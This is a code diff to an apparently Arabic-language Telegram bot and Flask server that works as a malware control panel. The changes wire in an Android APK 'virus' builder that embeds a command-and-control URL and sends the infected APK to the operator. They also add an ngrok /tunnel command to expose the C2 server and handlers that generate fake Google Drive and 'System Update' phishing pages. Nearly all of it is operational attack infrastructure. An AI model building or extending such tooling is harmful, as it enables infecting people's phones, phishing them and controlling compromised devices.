@@ -16,6 +16,15 @@ import asyncio
 from datetime import datetime
 from flask import Flask, send_file, request, jsonify
 
+# استيراد محرك البناء
+try:
+    from builder_engine.apk_builder import build_apk as build_apk_internal
+except ImportError:
+    def build_apk_internal(config): return None
+
+# متغير عالمي لرابط C2
+current_c2_url = None
+
 # ==================== ⚠️ الإعدادات - عدل هنا فقط ⚠️ ====================
 
 # 1. توكن بوت تيليجرام (احصل عليه من @BotFather)
@@ -122,7 +131,7 @@ async def status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         status_text += "\n❌ لا توجد أجهزة مخترقة حالياً"
     
-    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]]
+    keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await query.edit_message_text(status_text, reply_markup=reply_markup, parse_mode='Markdown')
@@ -145,7 +154,7 @@ async def devices_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ─────────────────
 """
     
-    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]]
+    keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
@@ -164,28 +173,65 @@ async def build_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     keyboard = [
         [InlineKeyboardButton("✅ بدء البناء", callback_data="build_start")],
-        [InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]
+        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
 
 async def build_start_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """بدء بناء الفيروس"""
+    """بدء عملية البناء الفعلية"""
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text("🔨 *جاري بناء الفيروس...*\n\nهذا قد يستغرق دقيقة...", parse_mode='Markdown')
+    config = context.user_data.get('build_config', {})
+    config['c2_server'] = current_c2_url
     
-    # هنا سيتم استدعاء محرك البناء
-    # هذا يحتاج للتكامل مع apk_builder.py
+    if not config.get('c2_server'):
+        await query.edit_message_text("❌ الرجاء تفعيل نفق ngrok أولاً. استخدم /tunnel")
+        return
     
-    await query.edit_message_text(
-        "✅ *تم بناء الفيروس بنجاح!*\n\n"
-        "📦 الملف جاهز في مجلد payloads/\n"
-        "🔗 استخدم /phish لتوليد صفحة تصيد مع الفيروس",
-        parse_mode='Markdown'
-    )
+    await query.edit_message_text("🔨 *جاري بناء الفيروس...*\nهذا قد يستغرق دقيقة.", parse_mode='Markdown')
+    
+    # البناء في خيط منفصل
+    def build_thread():
+        return build_apk_internal(config)
+    
+    import concurrent.futures
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        future = executor.submit(build_thread)
+        apk_path = future.result(timeout=120)
+    
+    if apk_path and os.path.exists(apk_path):
+        file_size = os.path.getsize(apk_path) / (1024 * 1024)
+        
+        # ========== إضافة: إرسال الملف مباشرة ==========
+        with open(apk_path, 'rb') as f:
+            await query.message.reply_document(
+                document=f,
+                filename=f"{config.get('app_name', 'UAMS_Infected')}.apk",
+                caption=f"🔨 فيروس {config.get('app_name', 'UAMS_Infected')}\nC2: {current_c2_url}"
+            )
+        # =============================================
+        
+        # ========== تعديل: إضافة زر الرجوع ==========
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            f"✅ *تم بناء الفيروس وإرساله أعلاه!*\n\n📏 الحجم: `{file_size:.2f} MB`",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+        # =============================================
+    else:
+        # ========== تعديل: إضافة زر الرجوع ==========
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(
+            "❌ فشل بناء الفيروس. تحقق من السجلات.",
+            reply_markup=reply_markup
+        )
+        # =============================================
 
 async def phish_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """قائمة صفحات التصيد"""
@@ -207,10 +253,40 @@ async def phish_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
     keyboard = [
         [InlineKeyboardButton("📁 Google Drive", callback_data="phish_gdrive")],
         [InlineKeyboardButton("🔄 System Update", callback_data="phish_update")],
-        [InlineKeyboardButton("🔙 رجوع", callback_data="refresh")]
+        [InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
+    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+
+async def phish_gdrive_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إنشاء صفحة تصيد Google Drive"""
+    query = update.callback_query
+    await query.answer()
+    
+    page_id, _ = create_phishing_page('google_drive')
+    domain = current_c2_url or os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost:5000')
+    if not domain.startswith('http'): domain = f"http://{domain}"
+    url = f"{domain}/phish/{page_id}"
+    
+    text = f"✅ *تم إنشاء صفحة Google Drive*\n\n🔗 الرابط: `{url}`"
+    keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+
+async def phish_update_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """إنشاء صفحة تصيد تحديث نظام"""
+    query = update.callback_query
+    await query.answer()
+    
+    page_id, _ = create_phishing_page('system_update')
+    domain = current_c2_url or os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost:5000')
+    if not domain.startswith('http'): domain = f"http://{domain}"
+    url = f"{domain}/phish/{page_id}"
+    
+    text = f"✅ *تم إنشاء صفحة System Update*\n\n🔗 الرابط: `{url}`"
+    keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="main_menu")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -230,8 +306,27 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await build_start_callback(update, context)
     elif data == "phish_menu":
         await phish_menu_callback(update, context)
-    elif data == "refresh":
+    elif data == "phish_gdrive":
+        await phish_gdrive_callback(update, context)
+    elif data == "phish_update":
+        await phish_update_callback(update, context)
+    elif data == "refresh" or data == "main_menu":
         await start_command(update, context)
+
+async def tunnel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """أمر /tunnel لتفعيل ngrok"""
+    global current_c2_url
+    user_id = update.effective_user.id
+    if not is_authorized(user_id): return
+    
+    await update.message.reply_text("🌐 جاري تفعيل نفق ngrok...")
+    
+    try:
+        from utils.ip_utils import create_tunnel_url
+        current_c2_url = create_tunnel_url(SERVER_PORT)
+        await update.message.reply_text(f"✅ تم تفعيل النفق بنجاح!\n🔗 الرابط: `{current_c2_url}`", parse_mode='Markdown')
+    except Exception as e:
+        await update.message.reply_text(f"❌ فشل تفعيل النفق: {e}")
 
 # ==================== سيرفر Flask (C2 + صفحات تصيد) ====================
 
@@ -405,6 +500,7 @@ def run_telegram_bot():
     telegram_app = Application.builder().token(BOT_TOKEN).build()
     
     telegram_app.add_handler(CommandHandler("start", start_command))
+    telegram_app.add_handler(CommandHandler("tunnel", tunnel_command))
     telegram_app.add_handler(CallbackQueryHandler(button_callback))
     
     logger.info("✅ بوت تيليجرام جاهز!")
